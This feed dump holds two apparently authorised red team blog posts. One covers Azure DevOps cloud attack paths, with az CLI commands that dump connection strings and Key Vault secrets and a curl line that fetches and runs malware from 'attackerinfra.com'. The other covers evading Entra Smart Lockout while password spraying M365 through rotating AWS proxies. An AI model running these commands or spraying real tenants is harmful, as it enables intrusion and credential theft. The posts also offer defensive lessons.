      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And the above list can continue with pretty much any Azure cloud enumeration command you can think of afterwards…obviously, you can also install new tools and execute them in this context.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Iterate through resources to fetch their connection strings to be used with Azure Storage Explorer or Azure Data Studio.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# Ensure you install jq with sudo apt install jq -y
# Find storage accounts
az storage account list | jq &amp;#34;.[].name&amp;#34; | awk &amp;#34;{print $1}&amp;#34; | xargs -I % sh -c &amp;#34;{ az storage account show-connection-string -n %; sleep 7;}&amp;#34; | jq &amp;#34;.connectionString&amp;#34;

#Find cosmosdb
az cosmosdb list | jq &amp;#34;.[].name&amp;#34; | awk &amp;#34;{print $1}&amp;#34; | xargs -I % sh -c &amp;#34;{ az cosmosdb list-connection-strings -n % --resource-group ; sleep 7;}&amp;#34; | jq &amp;#34;.connectionString&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Enumerate and fetch secrets from keyvaults.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# Show secrets names
az keyvault secret list --include-managed --vault-name &amp;#34;vault-name&amp;#34; --maxresults 25

# Show secrets&amp;#39;secret values :)
az keyvault secret show --vault-name vault-name --name &amp;#34;secrets-name&amp;#34; | jq &amp;#39;.value&amp;#39; | tr -d &amp;#39;&amp;#34;&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Download and execute malware, and sleep indefinitely to ensure the beacon is not killed. This is how you can maintain persistent access to an otherwise ephemeral box.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# Fetch the payload from attackerinfra.com
curl -k -X $&amp;#39;GET&amp;#39; \
-H $&amp;#39;Host: attackerinfra.com&amp;#39; -H $&amp;#39;Sec-Ch-Ua: \
&amp;#34;Not A(Brand\&amp;#34;;v=\&amp;#34;24\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;110\&amp;#34;&amp;#39; -H $&amp;#39;Sec-Ch-Ua-Mobile: ?0&amp;#39; -H $&amp;#39;Upgrade-Insecure-Requests: 1&amp;#39; [...] -H $&amp;#39;Connection: close&amp;#39; \
$&amp;#39;https://attackerinfra.com/MailDriverIntegration&amp;#39; &amp;gt; /home/agentuser/MailDriverIntegration

# Execute the malware
chmod &amp;#43;x /home/agentuser/MailDriverIntegration
sudo /home/agentuser/MailDriverIntegration &amp;amp; disown

# Sleep indefinitely
while [ 1 ]; do sleep 3; echo &amp;#34;test&amp;#34;; done;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In the past, these commands and techniques have given us unfettered access to a plethora of information and data. At times, this was sensitive business data that could demonstrate that damage could be done even with non-dev accounts in the cloud, which are usually less protected for ease of access. Clearly, this is a reason to extend security best practices to all the departments in an organisation.&lt;/p&gt;
&lt;h3&gt;The man in the high castle&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-man-in-the-high-castle&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-man-in-the-high-castle&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;By now you should hopefully have a decent amount of data, tokens and files to sift through (if not make sure you’ve looked through all accessible storage accounts). Some of the most juicy files you may find in DevOps environments are .tf files. These may be more common than you might expect as DevOps engineers and developers often make use of Terraform and Infrastructure as Code (IaC). If you come across these in your cloud red teaming engagement, you may have hit the jackpot.&lt;/p&gt;
&lt;p&gt;For those not familiar with these files, they contain the configuration and state information for infrastructure managed by Terraform, a popular infrastructure as code (IaC) tool, often used in DevOps. Terraform uses these state files to keep track of the infrastructure it manages, ensuring that it can update or delete resources automatically. This data is crucial as it includes sensitive information such as configuration details, encryption keys, API keys, and possibly credentials that are needed to manage the infrastructure components.&lt;/p&gt;
&lt;p&gt;Essentially, these files are a blueprint of the entire infrastructure&amp;rsquo;s architecture and contain all the necessary details to replicate or manipulate the environment. The exploration of such cloud storage can lead to the retrieval of service account credentials used to push code  to sometimes critical environments (i.e. &lt;strong&gt;&lt;em&gt;production&lt;/em&gt;&lt;/strong&gt;).&lt;/p&gt;
&lt;p&gt;Once you are able to steal a higher privileged set of credentials (double points if it was a service principal), you can consider re-running the same techniques as mentioned before to access new and more critical assets.&lt;/p&gt;
&lt;p&gt;Leveraging the above techniques in client environments we have succeeded in completing attack paths that have led from non-technical staff being able to move laterally and escalate privileges all the way to being able to push code to the production CI/CD pipeline! This would effectively represent a significant vantage point and positioning for a malicious actor, who can carry out disruptive attacks that may halt business operations, deny services to employees and customers, exfiltrate valuable intellectual property and possibly wipe off or alter any data in Azure for extortion purposes.&lt;/p&gt;
&lt;h3&gt;Lessons learned&lt;span class=&#34;absolute -mt-20&#34; id=&#34;lessons-learned&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#lessons-learned&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The fascinating exploration of the cloud world and its wonders serves as a reminder to us all of the necessity of striking a balance between the convenience of cloud adoption and the critical need for robust security practices. Some observations and takeaways stemming from our experience are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;If possible, restrict commit history and code deployment logs read access to administrators only when using Azure DevOps.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Limit code access in your pipeline to authorised devs only, who can read, write, pull, and push. Keeping an eye on access roles, especially for project manager accounts or non-techie accounts (usually lacking MFA, and generally less protected than devs’ accounts), is crucial for maintaining operational integrity and preventing abuses.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Implement granular firewall and access control rules (RBAC) at the resource group level to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;enforce strict separation of the SDLC environments.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;restrict access to resources (storage accounts, key vaults, and databases) to only authorised users, machines and/or IP addresses.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Protect your &lt;em&gt;tfstate&lt;/em&gt; files as if they were passwords! Credentials and connection strings can easily lay in there!&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Review if service principals are adhering to the policy of least privileged access, even for seemingly benign ephemeral code checking agents.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Always consider defence-in-depth and integrating security to your DevOps processes and environments.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you got here, thank you for reading and I hope this inspired you to look after your cloud DevOps environment a bit more thoroughly! :)&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Why sneak when you can walk through the front door - A Love letter to Password Spraying against M365 in Red Team Engagements</title>
      <link>//localhost:1313/articles/2024/05/2024-05-02-why-sneak-when-you-can-walk-through-the-front-door/</link>
      <pubDate>Thu, 02 May 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/05/2024-05-02-why-sneak-when-you-can-walk-through-the-front-door/</guid>
      <description>
        
        
        &lt;p&gt;In 2023 through 2024, JUMPSEC&amp;rsquo;s red team gained access to Microsft 365 (M365) environments of sophisticated clients during adversarial engagements with an approach that breathes life into the decades-old technique of password spraying. With threat actors increasingly using similar approaches in the wild, being able to compromise the even likes of &lt;em&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Microsoft themselves&lt;/a&gt;&lt;/em&gt;, it is my opinion that red teams might benefit from incorporating some of these techniques into their initial access arsenal, or even in external perimeter security testing, to better emulate adversaries and challenge assumptions around intial access.&lt;/p&gt;
&lt;h2&gt;Credit&lt;span class=&#34;absolute -mt-20&#34; id=&#34;credit&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#credit&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Full credit needs to be given to developers of the tools and authors of the following blog posts who kindly shared their ideas. This post is heavily inspired by the work of:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://www.trustedsec.com/blog/teamfiltration-v3-5-0-improve-all-the-things&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Teamfiltration v 3.5.3, initial v1 released in DEFCON 2022&lt;/a&gt;&lt;/em&gt; - Credits to Flangvik @ TrustedSec&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;//github.com/ustayready/fireprox&#34; &gt;&lt;em&gt;Fireprox, initial release in 2019&lt;/em&gt;&lt;/a&gt; - Credits to ustrayready @ Black Hills InfoSec&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://www.blackhillsinfosec.com/introducing-graphrunner/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Graphrunner, initial release in Oct 2023&lt;/a&gt;&lt;/em&gt; - Credits to dafthack @ Black Hills InfoSec&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Why M365?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;why-m365&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#why-m365&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Historically, Outlook accounts were &lt;em&gt;merely&lt;/em&gt; email inboxes with impactful but limited usability, but this is no longer the case. Barring the capacity to read sensitive businesss communications and impersonate internal users to phish others in an organisation, an attacker&amp;rsquo;s access to M365 accounts often lead to far more impact in hybrid or cloud-native organisations in 2024.&lt;/p&gt;
&lt;p&gt;For example, we have multiple clients where most if not all of their business critical data now resides in SharePoint and access control is tied to M365/Azure groups. An attacker compromising an account with SharePoint access is analogous to getting access to the data of an internal file server in a traditional on-prem context. Let&amp;rsquo;s say said account has read/write access to multiple business-critical SharePoint sites, then they are already analogous to being able to &amp;ldquo;deploy ransomware&amp;rdquo; in a traditional sense, if proper recovery procedures have not been implemented.&lt;/p&gt;
&lt;p&gt;In addition, an active M365 session grants access to GraphAPI and other Microsoft cloud resources, which is a fantastic entrypoint for lateral movement and persistence in the cloud. I do encourage checking out Black Hill&amp;rsquo;s incredible &lt;em&gt;&lt;a href=&#34;https://www.blackhillsinfosec.com/introducing-graphrunner/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;blog post&lt;/a&gt;&lt;/em&gt; on the subject of Azure / GraphAPI lateral movement with GraphRunner if you are interested.&lt;/p&gt;
&lt;h2&gt;The Theory Behind&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-theory-behind&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-theory-behind&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;User&amp;rsquo;s gonna user&lt;span class=&#34;absolute -mt-20&#34; id=&#34;users-gonna-user&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#users-gonna-user&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;So, given M365 accounts are juicy targets, how does one gain access? Besides MiTM phishing with tools like Evilginx, consider spraying your way in. The term &amp;ldquo;password spraying&amp;rdquo; refers to trying a small set of passwords (usually less than 20, or even 10 in this context) against a large number (hundreds, or more if possible) of users.&lt;/p&gt;
&lt;p&gt;The core idea is that even in an org with a &amp;ldquo;strong&amp;rdquo; password policy in length and complexity, some users are statistically likely to set easily guessable ones like &lt;code&gt;Welcome@2024&lt;/code&gt;. If an attacker can gather a large number of valid user emails (out of scope of this blog post, but there are many resources for this), they only need to target the statistically common passwords to get the highest chance to find a correct combination.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As a side note, Welcome@YYYY, Season@YYYY, WelcomeYYYY!, Orgname@YYYY appear to be some of the highest hit rate passwords we observed in engagements.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;While this is all well and good, there are 2 minor inconveniences in most modern OAuth providers in the forms of:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;intruder identification &amp;amp; blocking, and;&lt;/li&gt;
&lt;li&gt;user lockout.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Since we are targeting M365, we&amp;rsquo;ll discuss Microsoft&amp;rsquo;s implementation, &lt;strong&gt;Entra Smart Lockout&lt;/strong&gt;, which might surprise you.&lt;/p&gt;
&lt;h3&gt;Entra Smart Lockout&lt;span class=&#34;absolute -mt-20&#34; id=&#34;entra-smart-lockout&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#entra-smart-lockout&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;According to this &lt;em&gt;&lt;a href=&#34;https://techcommunity.microsoft.com/t5/microsoft-entra-blog/azure-ad-password-protection-and-smart-lockout-are-now-in-public/ba-p/245423&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;MS announcement&lt;/a&gt;&lt;/em&gt;, Smart Lockout is included in all versions of Azure AD (now called Entra ID, probably a different name in 2025?) including implementations in Office365, by default. Customisatiion of Smart Lockout settings &lt;em&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;requires Microsoft Entra ID P1 license or above&lt;/a&gt;&lt;/em&gt; (Licenses below P1 are stuck with default settings but Smark Lockout is still enabled). Therefore, all M365 corporate clients you encounter should have this feature turned on, and the only variation to expected would be the lockout settings.&lt;/p&gt;
&lt;p&gt;The default settings are as the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(For non-US government tenants): an account is locked after 10 failed attempts.&lt;/li&gt;
&lt;li&gt;The account locks again after each subsequent failed sign-in attempt.&lt;/li&gt;
&lt;li&gt;Lockout period is one minute at first, and longer in subsequent attempts. Microsoft does not disclose the rate at which the lockout period increases after unsuccessful sign-in attempts.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You might be thinking, where&amp;rsquo;s the smart in this, seems to merely be an incremental lockout timer, no? Here&amp;rsquo;s the &lt;em&gt;smart&lt;/em&gt; part:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;When smart lockout locks a user account, we try our best to not lock out the genuine user. To ensure that bad actors can&amp;rsquo;t gain access to a genuine user account. The following considerations apply:&lt;/p&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Familiar vs unfamiliar locations are used to differentiate between a bad actor and the genuine user. They have separate lockout counters.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Once an account is locked out, the lockout state is synchronised across all Microsoft Entra data centers.&lt;/li&gt;
&lt;li&gt;After an account lockout, the user can initiate self-service password reset (SSPR) to sign in again.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And there&amp;rsquo;s the fine print at the end:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In addition to Smart lockout, our default protection analyses and identifies other signals including IP traffic and anomalous behavior. Entra ID blocks these malicious sign-ins by default and returns &lt;em&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/entra/identity-platform/reference-error-codes&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AADSTS50053 - IdsLocked error code&lt;/a&gt;&lt;/em&gt;, regardless of the password validity.&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3&gt;TL;DR as in, sorry I didn&amp;rsquo;t read the Doc&lt;span class=&#34;absolute -mt-20&#34; id=&#34;tldr-as-in-sorry-i-didnt-read-the-doc&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#tldr-as-in-sorry-i-didnt-read-the-doc&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;From the Microsoft Documentations we can infer a few things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We need to bypass the lockout timer by spacing out attempts. &lt;em&gt;If attempts for the same user are sufficiently spaced out, the lockout timer (meaning, you won&amp;rsquo;t get in even with a correct password) might not hit you, the attacker&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;The attempts should come from different IP addresses, with minimal behavioral patterns that can be identified by Microsoft&amp;rsquo;s algos.&lt;/li&gt;
&lt;li&gt;Unfortunately, unless our attempts come from the same city or region that the user usually logs into, their daily work routine would not reset our &amp;ldquo;unfamiliar&amp;rdquo; lockout counter.&lt;/li&gt;
&lt;li&gt;The AADESTS50053 error can either mean Smart Lockout kicking in, locking the user account, or default protection. Nevertheless, it means we won&amp;rsquo;t get in with the correct password. That being said, &lt;em&gt;MS have an undisclosed internal timer that would reset in the latter case, or the user can unlock themselves via SSPR, so it might not be the end of the world when you see this error.&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;As said, if SSPR is on, users can unlock themselves, resulting in less disruption to the client. It is not a &amp;ldquo;get out of jail free&amp;rdquo; card though, as locking a single account may be extremely impactful if it&amp;rsquo;s the wrong one. We cannot overstate the importance of getting a good understanding of offensive toolings that you&amp;rsquo;re using, and having clear and open communcations with your client regarding some of these more &amp;ldquo;risky&amp;rdquo; tradecraft.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Fireprox&lt;span class=&#34;absolute -mt-20&#34; id=&#34;fireprox&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#fireprox&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;While APT Midnight Blizzard was reported &lt;em&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;obtain intial access on Microsoft using distributed residential proxies&lt;/a&gt;&lt;/em&gt; to perform password spraying, red teamers can achieve a similar result by utilising the AWS API gateway service, which can (by design) serve as a proxied gateway to … API services (duh). &lt;em&gt;&lt;a href=&#34;https://github.com/ustayready/fireprox&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Fireprox&lt;/a&gt;&lt;/em&gt; is a tool that creates a wrapper around the usage of this service to create a &amp;ldquo;distributed&amp;rdquo; proxy to send POST requests to login.microsoftonline.com. The next tool introduced in this blog post, Teamfiltration, also incorporates code from Fireprox in its codebase, so if you want to follow along, make sure to sort out the AWS pre-requisites here. You&amp;rsquo;d need:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;An AWS tenant that you control.&lt;/li&gt;
&lt;li&gt;Create a new IAM user, grant them &lt;code&gt;AmazonAPIGatewayAdministrator&lt;/code&gt; privileges by attaching the policy directly in permissions. Create an access key in &amp;ldquo;Security credentials&amp;rdquo;, choose &amp;ldquo;other&amp;rdquo;, and save the access key ID and secret key somewhere safe.&lt;/li&gt;
&lt;li&gt;(Optionally) Play with Fireprox to figure out what it does.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Basically, how Fireprox works is that you generate a static AWS URL to access an endpoint through AWS&amp;rsquo;s proxy. What makes it interesting is that a different egress IP address is used whenever a new request is made through that generated URL.&lt;/p&gt;
&lt;p&gt;For example, here we created a URL starting with &amp;ldquo;hudi24ri47&amp;rdquo; that is located in the region of us-east-1, and the target is ifconfig.me. By curl-ing repeatedly, we can see the egress IP observed by the target web server is different in every single request.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic2.png&#34; title=&#34;pic2&#34; alt=&#34;pic2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic1.png&#34; title=&#34;pic1&#34; alt=&#34;pic1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you are concerned about costs, API gateway is billed at 100k+ API calls for single digit dollars, so volume generated from engagements, which are usually around 10k requests, never amounted to more than a couple of pennies for us.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Obviously Microsoft would see that the logins come from AWS IP addresses, but that alone has not been enough to trigger lockouts. There are also AWS specific headers that are forwarded or added by the proxy, most importantly the &lt;code&gt;X-Amz-Forwarded-For&lt;/code&gt; header which is removed by Fireprox. You can easily verify this by using your own request catcher and curl with Fireprox and compare the requests received with those sent from vanilla API gateway proxies.&lt;/p&gt;
&lt;h2&gt;Caveats &amp;amp; Disclaimers&lt;span class=&#34;absolute -mt-20&#34; id=&#34;caveats--disclaimers&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#caveats--disclaimers&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Before we discuss the actual tradecraft, do note that you should seek explicit consent from your client before starting any password spraying, and preferrably start from a small user set to minimize disruption. Even if users can self-serve reset their password to unlock their accounts, locking up dozens or even hundreds of accounts, especially without your client&amp;rsquo;s prior knowledge and consent, is professionally unacceptable and the sort of thing that red teamers should avoid at all cost.&lt;/p&gt;
&lt;p&gt;To be absolutely certain about your methodology, spin up your own free (1 month trial) M365 tenant with a number of users to test your methodology before using it on real engagements, as Smart Lockout is enabled by default for all M365 tenants. In fact, when our own red team first dipped our toes into learning this, we started slow and with a lot of anxiety, even with this knowledge and clear communications with our clients. It was over the process of several engagements that we&amp;rsquo;ve learned in depth about how the tooling worked, the thresholds, and so on, that we are finally comfortable recommending it. Bear in mind that locking out accounts on engagements is no laughing matter, and that there is an expectation of professionalism from clients when they purchase a red team.&lt;/p&gt;
&lt;p&gt;Another thing to recommend is to have clear communications with the client regarding what hours the password spraying occur, as some clients do not want out-of-hour password spraying. A spray in our engagements usually takes 2-3 days to complete with Teamfiltration, depending how many passwords/users we can/want to try. Fortunately it can be paused and restarted at any point.&lt;/p&gt;
&lt;p&gt;Needless to say, you are responsible for your own actions.&lt;/p&gt;
&lt;h3&gt;Barging in with Teamfiltration&lt;span class=&#34;absolute -mt-20&#34; id=&#34;barging-in-with-teamfiltration&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#barging-in-with-teamfiltration&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;With the caveats out of the way, let&amp;rsquo;s dive in. While I write about Teamfiltration here, it is not the only tool for the job, though it is a very fine tool. Think of it as a many-in-one tool kit with user enumeration and data exfiltration, not just password spraying. If you just want password spraying with integration of AWS API gateway proxying (most of the below implemented that through Fireprox), there are a number of alternatives too:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://github.com/knavesec/CredMaster&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CredMaster&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://github.com/0xZDH/o365spray&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;o365spray&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://github.com/optiv/Go365&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Go365&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://github.com/Tw1sm/spraycharles&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;spraycharles&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And if you understand the concepts behind Smart Lockout, and maybe have had a read at the source code of Fireprox, it shouldn&amp;rsquo;t be too hard to implement a sprayer from scratch yourself. If you do want to write one, this reference on &lt;em&gt;&lt;a href=&#34;https://trustedsec.com/blog/from-error-to-entry-cracking-the-code-of-password-spraying-tools&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;M365 login error messages&lt;/a&gt;&lt;/em&gt; would be a must-read in my opinion.&lt;/p&gt;
&lt;h2&gt;Setting the tool up&lt;span class=&#34;absolute -mt-20&#34; id=&#34;setting-the-tool-up&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#setting-the-tool-up&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Teamfiltration&amp;rsquo;s author Flangvik&amp;rsquo;s own &lt;em&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=J8ohuanP2gA&amp;amp;list=PLxxLIupMt6nDN5bAJqBZFUpxp8Hcyzbkn&amp;amp;pp=iAQB&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Youtube playlist&lt;/a&gt;&lt;/em&gt; on the its usage is a great reference on how to set up and use the tool. I&amp;rsquo;d still go through the setup briefly here. Teamfiltration is designed around red team engagements and so it stores the information (valid usernames, credentials, password spray log, etc) in a local database, because you wouldn&amp;rsquo;t want to mix the sensitive details of Bank A and Retail Chain B, for example. The tool is designed for a sequential workflow of using &lt;code&gt;--enum&lt;/code&gt; to find valid users, &lt;code&gt;--spray&lt;/code&gt; to find valid username:password pair, and then &lt;code&gt;--exfil&lt;/code&gt; to loot. The reason I go into this is that there is a little quirk of Teamfiltration &amp;ndash; the &lt;code&gt;--spray&lt;/code&gt; module does not seem to have &lt;code&gt;-user&lt;/code&gt; flag (yet?) as it reads the validated users from the local database from prior runs of &lt;code&gt;--enum&lt;/code&gt; which would confuse the heck out of operators who don&amp;rsquo;t know this.&lt;/p&gt;
&lt;p&gt;Beside each of your clients having their own local database, there is also the Teamfiltration profile, which is a json file that you supply to the tool everytime you run it. From an Opsec perspective it does not seem to matter much regarding client segregation, though it offers you a way to further tweak settings inbetween jobs to cater to your needs.&lt;/p&gt;
&lt;p&gt;There are a number of optional inputs in a profile. At a minimum you need to supply:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A set of sacrificial O365 user credentials: The user needs to be in an Azure / M365 tenant. A private MSDN / Outlook / Live account would not work. Reason behind this is that user enum works by searching for a supplied email through Teams, much like how one would message an external org tenant. This functionality doesn&amp;rsquo;t work with accounts &lt;em&gt;not&lt;/em&gt; associated with a tenant. Though it is called &amp;ldquo;sacrificial&amp;rdquo; it is simply used to look people up on Teams.&lt;/li&gt;
